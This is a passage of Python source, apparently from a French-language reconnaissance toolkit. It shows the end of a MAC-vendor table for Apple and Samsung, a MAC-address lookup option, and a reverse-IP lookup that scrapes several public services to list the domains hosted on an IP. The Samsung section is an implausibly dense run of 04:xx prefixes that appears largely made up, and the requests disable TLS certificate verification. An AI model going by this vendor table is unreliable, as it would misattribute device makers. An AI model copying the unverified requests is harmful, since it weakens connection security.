    "98:E0:D9": "Apple, Inc.",
    "98:F0:AB": "Apple, Inc.",
    "98:FE:94": "Apple, Inc.",
    "9C:04:EB": "Apple, Inc.",
    "9C:20:7B": "Apple, Inc.",
    "9C:29:3F": "Apple, Inc.",
    "9C:35:EB": "Apple, Inc.",
    "9C:4F:DA": "Apple, Inc.",
    "9C:84:BF": "Apple, Inc.",
    "9C:8B:A0": "Apple, Inc.",
    "9C:F3:87": "Apple, Inc.",
    "9C:F4:8E": "Apple, Inc.",
    "9C:FC:01": "Apple, Inc.",
    "A0:18:28": "Apple, Inc.",
    "A0:99:9B": "Apple, Inc.",
    "A0:C9:A0": "Apple, Inc.",
    "A0:D7:95": "Apple, Inc.",
    "A0:ED:CD": "Apple, Inc.",
    "A4:13:4E": "Apple, Inc.",
    "A4:67:06": "Apple, Inc.",
    "A4:83:E7": "Apple, Inc.",
    "A4:B1:97": "Apple, Inc.",
    "A4:C3:61": "Apple, Inc.",
    "A4:D1:8C": "Apple, Inc.",
    "A4:D1:D2": "Apple, Inc.",
    "A4:F1:E8": "Apple, Inc.",
    "A8:20:66": "Apple, Inc.",
    "A8:5B:78": "Apple, Inc.",
    "A8:5C:2C": "Apple, Inc.",
    "A8:66:7F": "Apple, Inc.",
    "A8:86:DD": "Apple, Inc.",
    "A8:88:08": "Apple, Inc.",
    "A8:8E:24": "Apple, Inc.",
    "A8:96:8A": "Apple, Inc.",
    "A8:BB:CF": "Apple, Inc.",
    "A8:C8:85": "Apple, Inc.",
    "A8:FA:D8": "Apple, Inc.",
    "AC:29:3A": "Apple, Inc.",
    "AC:3C:0B": "Apple, Inc.",
    "AC:61:EA": "Apple, Inc.",
    "AC:7F:3E": "Apple, Inc.",
    "AC:87:A3": "Apple, Inc.",
    "AC:BC:32": "Apple, Inc.",
    "AC:CF:5C": "Apple, Inc.",
    "AC:D1:B8": "Apple, Inc.",
    "AC:F1:DF": "Apple, Inc.",
    "B0:34:95": "Apple, Inc.",
    "B0:65:BD": "Apple, Inc.",
    "B0:9F:BA": "Apple, Inc.",
    "B0:CA:68": "Apple, Inc.",
    "B4:18:D1": "Apple, Inc.",
    "B4:4B:D6": "Apple, Inc.",
    "B4:8B:19": "Apple, Inc.",
    "B4:99:BA": "Apple, Inc.",
    "B4:F0:AB": "Apple, Inc.",
    "B8:09:8A": "Apple, Inc.",
    "B8:17:C2": "Apple, Inc.",
    "B8:41:A4": "Apple, Inc.",
    "B8:44:D9": "Apple, Inc.",
    "B8:53:AC": "Apple, Inc.",
    "B8:5D:0A": "Apple, Inc.",
    "B8:63:4D": "Apple, Inc.",
    "B8:78:2E": "Apple, Inc.",
    "B8:8D:12": "Apple, Inc.",
    "B8:9F:09": "Apple, Inc.",
    "B8:C1:11": "Apple, Inc.",
    "B8:C7:5D": "Apple, Inc.",
    "B8:E8:56": "Apple, Inc.",
    "B8:F6:B1": "Apple, Inc.",
    "B8:FF:61": "Apple, Inc.",
    "BC:3B:AF": "Apple, Inc.",
    "BC:4C:C4": "Apple, Inc.",
    "BC:52:B7": "Apple, Inc.",
    "BC:54:36": "Apple, Inc.",
    "BC:67:78": "Apple, Inc.",
    "BC:6C:21": "Apple, Inc.",
    "BC:92:6B": "Apple, Inc.",
    "BC:A9:20": "Apple, Inc.",
    "BC:EC:5D": "Apple, Inc.",
    "BC:FE:D9": "Apple, Inc.",
    "C0:1A:DA": "Apple, Inc.",
    "C0:63:94": "Apple, Inc.",
    "C0:84:7A": "Apple, Inc.",
    "C0:9F:42": "Apple, Inc.",
    "C0:CE:CD": "Apple, Inc.",
    "C0:D0:12": "Apple, Inc.",
    "C0:F2:FB": "Apple, Inc.",
    "C4:2C:03": "Apple, Inc.",
    "C4:B3:01": "Apple, Inc.",
    "C4:B9:CD": "Apple, Inc.",
    "C4:CC:74": "Apple, Inc.",
    "C8:1E:E7": "Apple, Inc.",
    "C8:2A:14": "Apple, Inc.",
    "C8:69:CD": "Apple, Inc.",
    "C8:6F:1D": "Apple, Inc.",
    "C8:85:50": "Apple, Inc.",
    "C8:B5:B7": "Apple, Inc.",
    "C8:BC:C8": "Apple, Inc.",
    "C8:D0:83": "Apple, Inc.",
    "C8:E0:EB": "Apple, Inc.",
    "C8:F6:50": "Apple, Inc.",
    "CC:08:8D": "Apple, Inc.",
    "CC:25:EF": "Apple, Inc.",
    "CC:29:F5": "Apple, Inc.",
    "CC:44:63": "Apple, Inc.",
    "CC:78:5F": "Apple, Inc.",
    "CC:C7:60": "Apple, Inc.",
    "D0:23:DB": "Apple, Inc.",
    "D0:25:98": "Apple, Inc.",
    "D0:33:11": "Apple, Inc.",
    "D0:4F:7E": "Apple, Inc.",
    "D0:81:7A": "Apple, Inc.",
    "D0:A6:37": "Apple, Inc.",
    "D0:C5:F3": "Apple, Inc.",
    "D0:E1:40": "Apple, Inc.",
    "D4:61:9D": "Apple, Inc.",
    "D4:9A:20": "Apple, Inc.",
    "D4:F4:6F": "Apple, Inc.",
    "D8:00:4D": "Apple, Inc.",
    "D8:1D:72": "Apple, Inc.",
    "D8:30:62": "Apple, Inc.",
    "D8:96:95": "Apple, Inc.",
    "D8:9E:3F": "Apple, Inc.",
    "D8:A2:5E": "Apple, Inc.",
    "D8:BB:2C": "Apple, Inc.",
    "D8:CF:9C": "Apple, Inc.",
    "D8:D1:CB": "Apple, Inc.",
    "DC:0C:5C": "Apple, Inc.",
    "DC:2B:2A": "Apple, Inc.",
    "DC:2B:61": "Apple, Inc.",
    "DC:37:14": "Apple, Inc.",
    "DC:41:5F": "Apple, Inc.",
    "DC:86:D8": "Apple, Inc.",
    "DC:9B:9C": "Apple, Inc.",
    "DC:A4:CA": "Apple, Inc.",
    "DC:A9:04": "Apple, Inc.",
    "E0:5F:45": "Apple, Inc.",
    "E0:66:78": "Apple, Inc.",
    "E0:B5:2D": "Apple, Inc.",
    "E0:B9:BA": "Apple, Inc.",
    "E0:C7:67": "Apple, Inc.",
    "E0:C9:7A": "Apple, Inc.",
    "E0:F5:C6": "Apple, Inc.",
    "E0:F8:47": "Apple, Inc.",
    "E4:25:E7": "Apple, Inc.",
    "E4:2B:34": "Apple, Inc.",
    "E4:50:EB": "Apple, Inc.",
    "E4:8B:7F": "Apple, Inc.",
    "E4:9A:79": "Apple, Inc.",
    "E4:C6:3D": "Apple, Inc.",
    "E4:CE:8F": "Apple, Inc.",
    "E4:E4:AB": "Apple, Inc.",
    "E8:04:0B": "Apple, Inc.",
    "E8:06:88": "Apple, Inc.",
    "E8:8D:28": "Apple, Inc.",
    "E8:B2:AC": "Apple, Inc.",
    "EC:35:86": "Apple, Inc.",
    "EC:85:2F": "Apple, Inc.",
    "EC:AD:B8": "Apple, Inc.",
    "F0:18:98": "Apple, Inc.",
    "F0:24:75": "Apple, Inc.",
    "F0:99:BF": "Apple, Inc.",
    "F0:B0:E7": "Apple, Inc.",
    "F0:C1:F1": "Apple, Inc.",
    "F0:D1:A9": "Apple, Inc.",
    "F0:DB:E2": "Apple, Inc.",
    "F0:DB:F8": "Apple, Inc.",
    "F0:DC:E2": "Apple, Inc.",
    "F0:F6:1C": "Apple, Inc.",
    "F4:0F:24": "Apple, Inc.",
    "F4:15:63": "Apple, Inc.",
    "F4:31:C3": "Apple, Inc.",
    "F4:37:B7": "Apple, Inc.",
    "F4:5C:89": "Apple, Inc.",
    "F4:F1:5A": "Apple, Inc.",
    "F4:F9:51": "Apple, Inc.",
    "F8:1E:DF": "Apple, Inc.",
    "F8:27:93": "Apple, Inc.",
    "F8:38:80": "Apple, Inc.",
    "F8:4D:89": "Apple, Inc.",
    "F8:6F:C1": "Apple, Inc.",
    "F8:95:C7": "Apple, Inc.",
    "F8:FF:C2": "Apple, Inc.",
    "FC:25:3F": "Apple, Inc.",
    "FC:E9:98": "Apple, Inc.",
    "FC:FC:48": "Apple, Inc.",

    # Samsung
    "00:12:FB": "Samsung Electronics Co.,Ltd",
    "00:13:77": "Samsung Electronics Co.,Ltd",
    "00:15:99": "Samsung Electronics Co.,Ltd",
    "00:15:B9": "Samsung Electronics Co.,Ltd",
    "00:16:32": "Samsung Electronics Co.,Ltd",
    "00:16:6B": "Samsung Electronics Co.,Ltd",
    "00:16:6C": "Samsung Electronics Co.,Ltd",
    "00:16:DB": "Samsung Electronics Co.,Ltd",
    "00:17:C9": "Samsung Electronics Co.,Ltd",
    "00:17:D5": "Samsung Electronics Co.,Ltd",
    "00:18:AF": "Samsung Electronics Co.,Ltd",
    "00:1A:8A": "Samsung Electronics Co.,Ltd",
    "00:1B:98": "Samsung Electronics Co.,Ltd",
    "00:1C:43": "Samsung Electronics Co.,Ltd",
    "00:1D:25": "Samsung Electronics Co.,Ltd",
    "00:1D:F6": "Samsung Electronics Co.,Ltd",
    "00:1E:7D": "Samsung Electronics Co.,Ltd",
    "00:1E:E1": "Samsung Electronics Co.,Ltd",
    "00:1E:E2": "Samsung Electronics Co.,Ltd",
    "00:1F:CC": "Samsung Electronics Co.,Ltd",
    "00:1F:CD": "Samsung Electronics Co.,Ltd",
    "00:21:19": "Samsung Electronics Co.,Ltd",
    "00:21:D1": "Samsung Electronics Co.,Ltd",
    "00:21:D2": "Samsung Electronics Co.,Ltd",
    "00:23:39": "Samsung Electronics Co.,Ltd",
    "00:23:D6": "Samsung Electronics Co.,Ltd",
    "00:23:D7": "Samsung Electronics Co.,Ltd",
    "00:24:54": "Samsung Electronics Co.,Ltd",
    "00:24:90": "Samsung Electronics Co.,Ltd",
    "00:24:91": "Samsung Electronics Co.,Ltd",
    "00:25:38": "Samsung Electronics Co.,Ltd",
    "00:25:66": "Samsung Electronics Co.,Ltd",
    "00:25:67": "Samsung Electronics Co.,Ltd",
    "00:26:37": "Samsung Electronics Co.,Ltd",
    "00:26:5D": "Samsung Electronics Co.,Ltd",
    "00:26:5F": "Samsung Electronics Co.,Ltd",
    "00:50:F9": "Samsung Electronics Co.,Ltd",
    "00:54:BD": "Samsung Electronics Co.,Ltd",
    "00:5E:DD": "Samsung Electronics Co.,Ltd",
    "00:60:32": "Samsung Electronics Co.,Ltd",
    "00:66:5A": "Samsung Electronics Co.,Ltd",
    "00:68:EB": "Samsung Electronics Co.,Ltd",
    "00:6F:64": "Samsung Electronics Co.,Ltd",
    "00:73:E0": "Samsung Electronics Co.,Ltd",
    "00:7C:2D": "Samsung Electronics Co.,Ltd",
    "00:80:4E": "Samsung Electronics Co.,Ltd",
    "00:86:A0": "Samsung Electronics Co.,Ltd",
    "00:8E:F2": "Samsung Electronics Co.,Ltd",
    "00:97:4F": "Samsung Electronics Co.,Ltd",
    "00:99:11": "Samsung Electronics Co.,Ltd",
    "00:9E:E1": "Samsung Electronics Co.,Ltd",
    "00:A0:D6": "Samsung Electronics Co.,Ltd",
    "00:B5:D0": "Samsung Electronics Co.,Ltd",
    "00:BA:9D": "Samsung Electronics Co.,Ltd",
    "00:BF:6D": "Samsung Electronics Co.,Ltd",
    "00:CB:BD": "Samsung Electronics Co.,Ltd",
    "00:CC:FC": "Samsung Electronics Co.,Ltd",
    "00:D0:F1": "Samsung Electronics Co.,Ltd",
    "00:E3:B2": "Samsung Electronics Co.,Ltd",
    "00:E4:00": "Samsung Electronics Co.,Ltd",
    "00:E4:21": "Samsung Electronics Co.,Ltd",
    "00:E6:2D": "Samsung Electronics Co.,Ltd",
    "00:EB:2D": "Samsung Electronics Co.,Ltd",
    "00:EE:BD": "Samsung Electronics Co.,Ltd",
    "00:EF:28": "Samsung Electronics Co.,Ltd",
    "00:F5:4E": "Samsung Electronics Co.,Ltd",
    "00:F7:AD": "Samsung Electronics Co.,Ltd",
    "00:FA:21": "Samsung Electronics Co.,Ltd",
    "04:02:1F": "Samsung Electronics Co.,Ltd",
    "04:04:EA": "Samsung Electronics Co.,Ltd",
    "04:09:73": "Samsung Electronics Co.,Ltd",
    "04:13:7A": "Samsung Electronics Co.,Ltd",
    "04:18:0F": "Samsung Electronics Co.,Ltd",
    "04:18:65": "Samsung Electronics Co.,Ltd",
    "04:1B:BA": "Samsung Electronics Co.,Ltd",
    "04:1D:10": "Samsung Electronics Co.,Ltd",
    "04:20:84": "Samsung Electronics Co.,Ltd",
    "04:21:4C": "Samsung Electronics Co.,Ltd",
    "04:24:E5": "Samsung Electronics Co.,Ltd",
    "04:2A:E2": "Samsung Electronics Co.,Ltd",
    "04:2B:BB": "Samsung Electronics Co.,Ltd",
    "04:32:53": "Samsung Electronics Co.,Ltd",
    "04:36:04": "Samsung Electronics Co.,Ltd",
    "04:3A:0D": "Samsung Electronics Co.,Ltd",
    "04:3D:98": "Samsung Electronics Co.,Ltd",
    "04:3E:61": "Samsung Electronics Co.,Ltd",
    "04:44:A1": "Samsung Electronics Co.,Ltd",
    "04:46:65": "Samsung Electronics Co.,Ltd",
    "04:48:9A": "Samsung Electronics Co.,Ltd",
    "04:4B:ED": "Samsung Electronics Co.,Ltd",
    "04:4E:AF": "Samsung Electronics Co.,Ltd",
    "04:52:C7": "Samsung Electronics Co.,Ltd",
    "04:53:D5": "Samsung Electronics Co.,Ltd",
    "04:55:CA": "Samsung Electronics Co.,Ltd",
    "04:56:65": "Samsung Electronics Co.,Ltd",
    "04:56:E5": "Samsung Electronics Co.,Ltd",
    "04:58:6F": "Samsung Electronics Co.,Ltd",
    "04:5D:4B": "Samsung Electronics Co.,Ltd",
    "04:5D:56": "Samsung Electronics Co.,Ltd",
    "04:5F:A7": "Samsung Electronics Co.,Ltd",
    "04:63:E0": "Samsung Electronics Co.,Ltd",
    "04:64:48": "Samsung Electronics Co.,Ltd",
    "04:66:2D": "Samsung Electronics Co.,Ltd",
    "04:67:61": "Samsung Electronics Co.,Ltd",
    "04:68:65": "Samsung Electronics Co.,Ltd",
    "04:6C:59": "Samsung Electronics Co.,Ltd",
    "04:6D:22": "Samsung Electronics Co.,Ltd",
    "04:6E:02": "Samsung Electronics Co.,Ltd",
    "04:70:BC": "Samsung Electronics Co.,Ltd",
    "04:71:4B": "Samsung Electronics Co.,Ltd",
    "04:74:A1": "Samsung Electronics Co.,Ltd",
    "04:75:F9": "Samsung Electronics Co.,Ltd",
    "04:79:70": "Samsung Electronics Co.,Ltd",
    "04:7B:CB": "Samsung Electronics Co.,Ltd",
    "04:7C:16": "Samsung Electronics Co.,Ltd",
    "04:7D:50": "Samsung Electronics Co.,Ltd",
    "04:7E:4A": "Samsung Electronics Co.,Ltd",
    "04:7F:0E": "Samsung Electronics Co.,Ltd",
    "04:80:0A": "Samsung Electronics Co.,Ltd",
    "04:81:AE": "Samsung Electronics Co.,Ltd",
    "04:84:8A": "Samsung Electronics Co.,Ltd",
    "04:86:80": "Samsung Electronics Co.,Ltd",
    "04:88:5F": "Samsung Electronics Co.,Ltd",
    "04:88:E2": "Samsung Electronics Co.,Ltd",
    "04:89:10": "Samsung Electronics Co.,Ltd",
    "04:89:58": "Samsung Electronics Co.,Ltd",
    "04:8A:15": "Samsung Electronics Co.,Ltd",
    "04:8B:42": "Samsung Electronics Co.,Ltd",
    "04:8C:03": "Samsung Electronics Co.,Ltd",
    "04:8C:9A": "Samsung Electronics Co.,Ltd",
    "04:8D:38": "Samsung Electronics Co.,Ltd",
    "04:8E:BF": "Samsung Electronics Co.,Ltd",
    "04:8F:00": "Samsung Electronics Co.,Ltd",
    "04:91:62": "Samsung Electronics Co.,Ltd",
    "04:92:26": "Samsung Electronics Co.,Ltd",
    "04:95:E6": "Samsung Electronics Co.,Ltd",
    "04:98:F3": "Samsung Electronics Co.,Ltd",
    "04:99:B9": "Samsung Electronics Co.,Ltd",
    "04:99:E6": "Samsung Electronics Co.,Ltd",
    "04:9B:9C": "Samsung Electronics Co.,Ltd",
    "04:9D:FE": "Samsung Electronics Co.,Ltd",
    "04:9F:06": "Samsung Electronics Co.,Ltd",
    "04:9F:CA": "Samsung Electronics Co.,Ltd",
    "04:A1:51": "Samsung Electronics Co.,Ltd",
    "04:A3:16": "Samsung Electronics Co.,Ltd",
    "04:A6:C8": "Samsung Electronics Co.,Ltd",
    "04:A8:2A": "Samsung Electronics Co.,Ltd",
    "04:A9:3E": "Samsung Electronics Co.,Ltd",
    "04:AB:18": "Samsung Electronics Co.,Ltd",
    "04:AC:44": "Samsung Electronics Co.,Ltd",
    "04:AE:C7": "Samsung Electronics Co.,Ltd",
    "04:B0:E7": "Samsung Electronics Co.,Ltd",
    "04:B1:67": "Samsung Electronics Co.,Ltd",
    "04:B4:29": "Samsung Electronics Co.,Ltd",
    "04:B4:FE": "Samsung Electronics Co.,Ltd",
    "04:B6:48": "Samsung Electronics Co.,Ltd",
    "04:B9:E3": "Samsung Electronics Co.,Ltd",
    "04:BA:36": "Samsung Electronics Co.,Ltd",
    "04:BA:8D": "Samsung Electronics Co.,Ltd",
    "04:BB:F9": "Samsung Electronics Co.,Ltd",
    "04:BC:6D": "Samsung Electronics Co.,Ltd",
    "04:BD:70": "Samsung Electronics Co.,Ltd",
    "04:BD:88": "Samsung Electronics Co.,Ltd",
    "04:BD:BF": "Samsung Electronics Co.,Ltd",
    "04:BE:58": "Samsung Electronics Co.,Ltd",
    "04:BF:1B": "Samsung Electronics Co.,Ltd",
    "04:BF:6D": "Samsung Electronics Co.,Ltd",
    "04:C0:5B": "Samsung Electronics Co.,Ltd",
    "04:C0:6F": "Samsung Electronics Co.,Ltd",
    "04:C0:9C": "Samsung Electronics Co.,Ltd",
    "04:C1:03": "Samsung Electronics Co.,Ltd",
    "04:C1:B9": "Samsung Electronics Co.,Ltd",
    "04:C2:3E": "Samsung Electronics Co.,Ltd",
    "04:C2:41": "Samsung Electronics Co.,Ltd",
    "04:C2:9B": "Samsung Electronics Co.,Ltd",
    "04:C3:E6": "Samsung Electronics Co.,Ltd",
    "04:C4:61": "Samsung Electronics Co.,Ltd",
    "04:C5:A4": "Samsung Electronics Co.,Ltd",
    "04:C5:CD": "Samsung Electronics Co.,Ltd",
    "04:C6:6B": "Samsung Electronics Co.,Ltd",
    "04:C8:07": "Samsung Electronics Co.,Ltd",
    "04:C9:91": "Samsung Electronics Co.,Ltd",
    "04:C9:D9": "Samsung Electronics Co.,Ltd",
    "04:CA:ED": "Samsung Electronics Co.,Ltd",
    "04:CB:1D": "Samsung Electronics Co.,Ltd",
    "04:CB:88": "Samsung Electronics Co.,Ltd",
    "04:CC:BC": "Samsung Electronics Co.,Ltd",
    "04:CD:15": "Samsung Electronics Co.,Ltd",
    "04:CE:14": "Samsung Electronics Co.,Ltd",
    "04:CF:25": "Samsung Electronics Co.,Ltd",
    "04:CF:8C": "Samsung Electronics Co.,Ltd",
    "04:D0:F5": "Samsung Electronics Co.,Ltd",
    "04:D1:3A": "Samsung Electronics Co.,Ltd",
    "04:D3:20": "Samsung Electronics Co.,Ltd",
    "04:D3:90": "Samsung Electronics Co.,Ltd",
    "04:D3:B0": "Samsung Electronics Co.,Ltd",
    "04:D3:CF": "Samsung Electronics Co.,Ltd",
    "04:D4:37": "Samsung Electronics Co.,Ltd",
    "04:D4:C4": "Samsung Electronics Co.,Ltd",
    "04:D5:90": "Samsung Electronics Co.,Ltd",
    "04:D6:AA": "Samsung Electronics Co.,Ltd",
    "04:D6:F4": "Samsung Electronics Co.,Ltd",
    "04:D7:83": "Samsung Electronics Co.,Ltd",
    "04:D8:83": "Samsung Electronics Co.,Ltd",
    "04:D9:F5": "Samsung Electronics Co.,Ltd",
    "04:DA:D2": "Samsung Electronics Co.,Ltd",
    "04:DB:56": "Samsung Electronics Co.,Ltd",
    "04:DB:8A": "Samsung Electronics Co.,Ltd",
    "04:DD:4C": "Samsung Electronics Co.,Ltd",
    "04:DE:DB": "Samsung Electronics Co.,Ltd",
    "04:DE:F2": "Samsung Electronics Co.,Ltd",
    "04:DF:69": "Samsung Electronics Co.,Ltd",
    "04:E1:C8": "Samsung Electronics Co.,Ltd",
    "04:E2:29": "Samsung Electronics Co.,Ltd",
    "04:E2:F5": "Samsung Electronics Co.,Ltd",
    "04:E3:1A": "Samsung Electronics Co.,Ltd",
    "04:E3:87": "Samsung Electronics Co.,Ltd",
    "04:E3:C1": "Samsung Electronics Co.,Ltd",
    "04:E3:E5": "Samsung Electronics Co.,Ltd",
    "04:E4:51": "Samsung Electronics Co.,Ltd",
    "04:E4:B6": "Samsung Electronics Co.,Ltd",
    "04:E4:CF": "Samsung Electronics Co.,Ltd",
    "04:E5:36": "Samsung Electronics Co.,Ltd",
    "04:E5:98": "Samsung Electronics Co.,Ltd",
    "04:E6:62": "Samsung Electronics Co.,Ltd",
    "04:E6:76": "Samsung Electronics Co.,Ltd",
    "04:E7:7E": "Samsung Electronics Co.,Ltd",
    "04:E8:B9": "Samsung Electronics Co.,Ltd",
    "04:E9:E5": "Samsung Electronics Co.,Ltd",
    "04:EA:56": "Samsung Electronics Co.,Ltd",
    "04:EB:40": "Samsung Electronics Co.,Ltd",
    "04:EC:BB": "Samsung Electronics Co.,Ltd",
    "04:ED:33": "Samsung Electronics Co.,Ltd",
    "04:EE:03": "Samsung Electronics Co.,Ltd",
    "04:EE:91": "Samsung Electronics Co.,Ltd",
    "04:EE:E8": "Samsung Electronics Co.,Ltd",
    "04:EF:4C": "Samsung Electronics Co.,Ltd",
    "04:EF:56": "Samsung Electronics Co.,Ltd",
    "04:F0:21": "Samsung Electronics Co.,Ltd",
    "04:F1:28": "Samsung Electronics Co.,Ltd",
    "04:F1:3E": "Samsung Electronics Co.,Ltd",
    "04:F1:69": "Samsung Electronics Co.,Ltd",
    "04:F1:7D": "Samsung Electronics Co.,Ltd",
    "04:F2:4F": "Samsung Electronics Co.,Ltd",
    "04:F3:52": "Samsung Electronics Co.,Ltd",
    "04:F4:BC": "Samsung Electronics Co.,Ltd",
    "04:F5:47": "Samsung Electronics Co.,Ltd",
    "04:F6:0B": "Samsung Electronics Co.,Ltd",
    "04:F7:78": "Samsung Electronics Co.,Ltd",
    "04:F7:E4": "Samsung Electronics Co.,Ltd",
    "04:F8:C2": "Samsung Electronics Co.,Ltd",
    "04:F9:38": "Samsung Electronics Co.,Ltd",
    "04:FA:83": "Samsung Electronics Co.,Ltd",
    "04:FA:3F": "Samsung Electronics Co.,Ltd",
    "04:FB:62": "Samsung Electronics Co.,Ltd",
    "04:FC:14": "Samsung Electronics Co.,Ltd",
    "04:FC:52": "Samsung Electronics Co.,Ltd",
    "04:FC:E5": "Samsung Electronics Co.,Ltd",
    "04:FD:6A": "Samsung Electronics Co.,Ltd",
    "04:FD:6C": "Samsung Electronics Co.,Ltd",
    "04:FE:31": "Samsung Electronics Co.,Ltd",
    "04:FE:7F": "Samsung Electronics Co.,Ltd",
    "04:FE:8D": "Samsung Electronics Co.,Ltd",
    "04:FE:A1": "Samsung Electronics Co.,Ltd",
    "04:FE:D9": "Samsung Electronics Co.,Ltd",
    "04:FF:08": "Samsung Electronics Co.,Ltd",
    "04:FF:51": "Samsung Electronics Co.,Ltd",
    "04:FF:5A": "Samsung Electronics Co.,Ltd",
}

def option_30():
    clear()
    banner()

    print(f"\n{CYAN}   [ MAC ADDRESS LOOKUP ]{RESET}\n")
    print(f"{GRAY}  Identifie le fabricant d'une adresse MAC.{RESET}\n")
    print(f"{GRAY}  Formats acceptes : XX:XX:XX:XX:XX:XX, XX-XX-XX-XX-XX-XX, XXXXXX.{RESET}\n")

    mac = input(f"{YELLOW}[?]{RESET} Adresse MAC {RED}->{RESET} ").strip()
    if not mac:
        print(f"{RED}[!] MAC vide.{RESET}")
        pause()
        return

    # Nettoyage de la MAC
    clean_mac = re.sub(r"[^a-fA-F0-9]", "", mac).upper()
    
    if len(clean_mac) < 6:
        print(f"{RED}[!] Adresse MAC invalide (trop courte).{RESET}")
        pause()
        return

    # Extraction du préfixe OUI (6 premiers caractères)
    oui_prefix = ":".join([clean_mac[i:i+2] for i in range(0, 6, 2)])
    
    # Format MAC formaté
    formatted_mac = ":".join([clean_mac[i:i+2] for i in range(0, min(len(clean_mac), 12), 2)])
    
    print(f"\n{CYAN}   RESULTAT{RESET}\n")
    print(f"  {GREEN}MAC complete : {WHITE}{formatted_mac}{RESET}")
    print(f"  {GREEN}Prefixe OUI  : {WHITE}{oui_prefix}{RESET}")
    print(f"  {GREEN}Format       : {WHITE}{'Universel (UAA=0)' if (int(clean_mac[0:2], 16) & 0x02) == 0 else 'Local (UAA=1)'}{RESET}")
    
    vendor = OUI_DATABASE.get(oui_prefix)
    if vendor:
        print(f"  {GREEN}Fabricant    : {WHITE}{vendor}{RESET}")
    else:
        print(f"  {YELLOW}Fabricant    : Inconnu dans la base locale{RESET}")
        print(f"{GRAY}  → Tentative via API (macvendors.com)...{RESET}")
        
        # Fallback API
        if requests:
            try:
                r = requests.get(f"https://api.macvendors.com/{formatted_mac}", timeout=5)
                if r.status_code == 200:
                    print(f"  {GREEN}Fabricant    : {WHITE}{r.text}{RESET}")
                else:
                    print(f"  {GRAY}→ Non trouve sur macvendors.com{RESET}")
            except Exception:
                print(f"  {GRAY}→ API indisponible{RESET}")

    pause()


# ============================================================
#              OPTION 31 — REVERSE IP LOOKUP
# ============================================================

def option_31():
    clear()
    banner()
    
    if not _need_requests():
        pause()
        return

    print(f"\n{CYAN}   [ REVERSE IP LOOKUP ]{RESET}\n")
    print(f"{GRAY}  Trouve tous les domaines heberges sur une meme IP.{RESET}\n")

    target = input(f"{YELLOW}[?]{RESET} IP ou domaine {RED}->{RESET} ").strip()
    if not target:
        print(f"{RED}[!] Cible vide.{RESET}")
        pause()
        return

    target = target.removeprefix("https://").removeprefix("http://").rstrip("/").split("/")[0]

    # Résolution de l'IP
    print(f"{YELLOW}[*] Resolution...{RESET}")
    if re.match(r"^(?:\d{1,3}\.){3}\d{1,3}$", target):
        ip = target
    else:
        try:
            ip = socket.gethostbyname(target)
            print(f"{GREEN}[+] {target} -> {ip}{RESET}")
        except socket.gaierror:
            print(f"{RED}[!] DNS resolution impossible.{RESET}")
            pause()
            return

    print(f"{GREEN}[+] IP : {ip}{RESET}\n")

    print(f"{YELLOW}[*] Interrogation des sources...{RESET}\n")
    
    results = {}
    lock = threading.Lock()
    
    def safe_get(url, **kwargs):
        try:
            kwargs.setdefault("timeout", 15)
            kwargs.setdefault("verify", False)
            kwargs.setdefault("headers", {"User-Agent": "Mozilla/5.0 Chrome/124"})
            return requests.get(url, **kwargs)
        except Exception:
            return None

    # --- Source 1 : HackerTarget API ---
    def query_hackertarget():
        r = safe_get(f"https://api.hackertarget.com/reverseiplookup/?q={ip}")
        if r and r.status_code == 200 and "error" not in r.text.lower() and "no dns" not in r.text.lower():
            domains = [line.strip() for line in r.text.splitlines() if line.strip() and "." in line]
            with lock:
                results["hackertarget"] = domains
            print(f"{GREEN}[+] hackertarget : {len(domains)} domaines{RESET}")

    # --- Source 2 : RapidDNS ---
    def query_rapiddns():
        r = safe_get(f"https://rapiddns.io/sameip/{ip}?full=1")
        if r and r.status_code == 200:
            # Extraction via regex sur les résultats HTML
            domains = set(re.findall(r'<td>([a-zA-Z0-9\-\.]+\.[a-z]{2,})</td>', r.text))
            domains = {d for d in domains if not d.startswith("www.")}
            with lock:
                results["rapiddns"] = sorted(domains)
            print(f"{GREEN}[+] rapiddns : {len(domains)} domaines{RESET}")

    # --- Source 3 : AlienVault OTX (via passive DNS) ---
    def query_alienvault():
        r = safe_get(f"https://otx.alienvault.com/api/v1/indicators/IPv4/{ip}/passive_dns")
        if r and r.status_code == 200:
            try:
                data = r.json()
                domains = set()
                for rec in data.get("passive_dns", []):
                    hostname = rec.get("hostname", "").strip().lower()
                    if hostname and hostname != "unknown" and "." in hostname:
                        domains.add(hostname)
                with lock:
                    results["alienvault"] = sorted(domains)
                print(f"{GREEN}[+] alienvault : {len(domains)} domaines{RESET}")
            except Exception:
                pass

    # --- Source 4 : Bing (scraping) ---
    def query_bing():
        r = safe_get(f"https://www.bing.com/search?q=ip%3A{ip}")
        if r and r.status_code == 200:
            # Recherche de domaines dans les résultats
            domains = set(re.findall(r'https?://([a-zA-Z0-9\-\.]+\.[a-z]{2,})', r.text))
            domains = {d for d in domains if "bing.com" not in d and "microsoft.com" not in d and ip not in d}
            with lock:
                results["bing"] = sorted(domains)[:50]
            print(f"{GREEN}[+] bing : {len(domains)} domaines (approx){RESET}")

    # Lancement en parallèle
    threads = [
        threading.Thread(target=query_hackertarget, daemon=True),
        threading.Thread(target=query_rapiddns, daemon=True),
        threading.Thread(target=query_alienvault, daemon=True),
        threading.Thread(target=query_bing, daemon=True),
    ]
    for t in threads:
        t.start()
    for t in threads:
        t.join(timeout=20)

    # --- Fusion et dédoublonnage ---
    all_domains = set()
    for source, domains in results.items():
        all_domains.update(domains)
    
    all_domains = sorted(all_domains)

    print(f"\n\n{CYAN}{BOLD}═══════════════════════════════════════════════════{RESET}")
    print(f"{CYAN}{BOLD}   REVERSE IP — {ip}{RESET}")
    print(f"{CYAN}{BOLD}═══════════════════════════════════════════════════{RESET}\n")

    if all_domains:
        print(f"{GREEN}{BOLD}   DOMAINES TROUVES ({len(all_domains)}){RESET}\n")
        for d in all_domains[:100]:
            print(f"  {CYAN}▸{RESET} {WHITE}{d}{RESET}")
        
        if len(all_domains) > 100:
            print(f"\n{YELLOW}  ... et {len(all_domains) - 100} autres (dans le rapport){RESET}")
    else:
        print(f"{YELLOW}   Aucun domaine trouve pour cette IP.{RESET}")
        print(f"{GRAY}  (normal sur les serveurs dedies ou les IP isolees){RESET}")

    # --- Export ---
    try:
        out_dir = Path(_safe_workdir()) / "Output" / "ReverseIP"
        out_dir.mkdir(parents=True, exist_ok=True)
        out_file = out_dir / f"reverseip_{ip.replace('.', '_')}_{int(time.time())}.txt"
        
        with open(out_file, "w", encoding="utf-8") as f:
            f.write(f"Reverse IP Lookup\n")
            f.write(f"IP     : {ip}\n")
            f.write(f"Target : {target}\n")
